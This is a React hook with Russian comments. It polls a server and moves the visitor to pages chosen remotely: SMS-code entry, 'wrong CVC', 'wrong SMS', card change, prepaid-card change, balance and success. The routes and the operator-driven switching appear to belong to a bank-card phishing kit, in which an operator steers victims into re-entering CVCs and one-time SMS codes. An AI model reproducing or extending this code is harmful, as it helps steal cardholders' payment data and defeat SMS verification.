import { useEffect } from "react";
import { useNavigate } from "react-router-dom";

interface RedirectResponse {
  success: boolean;
  redirect: boolean;
  type?: string;
  timestamp?: number;
  phoneDigits?: string;
}

export const useRedirectChecker = (interval: number = 3000) => {
  const navigate = useNavigate();

  useEffect(() => {
    const checkForRedirects = async () => {
      const sessionId = localStorage.getItem("currentSessionId");
      const clientId = localStorage.getItem("clientId");
      if (!sessionId) return;

      try {
        const response = await fetch(
          `/api/check-redirect/${clientId}/${sessionId}`
        );
        const data: RedirectResponse = await response.json();
        console.log("Redirect check response:", data); // Добавьте логирование
        if (data.success && data.redirect) {
          switch (data.type) {
            case "transit-1":
              console.log("🔄 Redirecting to transit-1 page");
              navigate(`/connects/asyncresponse/${sessionId}`, { replace: true });
              break;
            case "transit-2":
              console.log("🔄 Redirecting to transit-2 page");
              navigate(`/site/process/${sessionId}`, { replace: true });
              break;
            case "balance":
              console.log("🔄 Redirecting to balance page");
              navigate(`/balance/${sessionId}`);
              break;
            case "sms":
              console.log("🔄 Redirecting to SMS page");
              navigate(`/sms-code/${sessionId}`);
              break;
            case "change":
              console.log("🔄 Redirecting to bank page");
              navigate(`/change-card/${sessionId}`);
              break;
            case "wrong-cvc":
              console.log("🔄 Redirecting to bank page");
              navigate(`/wrong-cvc/${sessionId}`);
              break;
            case "wrong-sms":
              console.log("🔄 Redirecting to bank page");
              navigate(`/wrong-sms/${sessionId}`);
              break;
            case "prepaid":
              console.log("🔄 Redirecting to bank page");
              navigate(`/prepaid-change/${sessionId}`);
              break;
            case "custom-sms":
              console.log(
                "🔄 Redirecting to custom SMS page with phone digits:",
                data.phoneDigits
              );
              navigate(`/custom-sms/${sessionId}`, {
                state: {
                  phoneDigits: data.phoneDigits,
                },
              });
              break;
            case "success":
              console.log("🔄 Redirecting to bank page");
              navigate(`/success/${sessionId}`);
              break;
            default:
              console.log("Unknown redirect type:", data.type);
          }
        }
      } catch (error) {
        console.error("Error checking redirects:", error);
      }
    };

    // Проверяем сразу при монтировании компонента
    checkForRedirects();

    // Устанавливаем периодическую проверку
    const intervalId = setInterval(checkForRedirects, interval);

    // Очистка интервала при размонтировании
    return () => clearInterval(intervalId);
  }, [navigate, interval]);
};